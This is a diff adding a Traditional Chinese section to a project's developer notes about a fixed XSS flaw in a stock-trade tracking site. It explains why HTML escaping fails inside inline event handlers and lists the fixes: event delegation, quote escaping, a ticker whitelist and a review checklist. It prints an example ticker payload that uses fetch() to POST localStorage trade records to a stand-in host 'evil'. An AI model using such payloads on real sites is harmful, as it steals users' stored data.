@@ -879,3 +879,57 @@ index / us / health_check 三頁同步。
 那台 Mac 不必再為了排程保持醒著，`sudo pmset repeat wake` 可以取消
 （`sudo pmset repeat cancel`），`~/actions-runner` 的 launchd service 也可以停掉。
 Whisper / Ollama 那些本機依賴同樣不再需要。
+
+---
+
+## XSS：使用者輸入絕對不要進 inline handler（2026/09 修）
+
+實際存在過、已驗證可觸發的漏洞。修法與教訓都記在這裡，別再寫回去。
+
+### 當時的問題
+
+`trades.html` 把股票代號塞進 inline 事件處理器：
+
+```js
+onclick="toggleCode('${uid}')"      // uid = 代號 + ':held'
+```
+
+代號是使用者自己打的，也可能來自**匯入的備份檔**。代號裡放一個單引號就跳得出字串：
+
+```
+代號 = 2330');fetch('//evil',{method:'POST',body:localStorage.stock_trades_v1});//
+```
+
+那段程式跑在本站 origin 上，讀得到 localStorage 裡全部的交易紀錄並送出去。
+攻擊路徑很現實：**傳一個備份檔給你匯入**。
+
+### 為什麼「跳脫」不夠
+
+inline handler 的屬性值會**先被 HTML 解碼、再當 JS 解析**。
+所以把 `'` 換成 `&#39;` 完全沒用，瀏覽器會解回 `'`：
+
+```html
+<button onclick="f('a&#39;);alert(1);//')">   <!-- 解碼後 → f('a');alert(1);//') -->
+```
+
+這條實測驗證過。**只有 HTML 跳脫擋不住 inline handler。**
+
+### 現在的做法（三層）
+
+1. **不要 inline handler**。持股區改成 `data-act` / `data-uid` ＋ `document` 上的事件委派。
+   屬性值只是資料，永遠不會被當程式碼，整類問題消失，不用每個插值點都記得跳脫。
+   - ⚠️ 原本用來擋冒泡的 `onclick="event.stopPropagation()"` 必須一起改成 `data-act="noop"`，
+     否則它會在事件傳到委派之前就攔掉，備註按鈕會失效（踩過）。
+2. **`esc()` 要跳脫引號**（`"` 與 `'`），不是只有 `< > &`。
+3. **代號走白名單** `cleanCode()`：只留 `[A-Za-z0-9.-]`。
+   匯入時連同 `id` / `qty` / `price` / `side` / `market` 一起正規化，髒資料從源頭就進不來。
+
+`index.html` 的手動券商目標價（`manual_broker_targets`）有同一類問題：
+欄位直接進 `innerHTML`、代號進 `onclick="toggleStockDetail('${code}')"`。
+已加 `escHtml()` 與 `cleanCode()`，且 `loadManualTargets()` 會把**既有的舊資料**也清一次。
+
+### 檢查清單（之後改這些頁面時）
+
+- [ ] 有沒有把非 `data.json` 來源的值放進 `onclick=` / `onchange=`？→ 改 data-* ＋ 委派
+- [ ] 進 `innerHTML` 的使用者輸入有沒有過 `esc()` / `escHtml()`？
+- [ ] 新的匯入／貼上入口有沒有做欄位正規化？
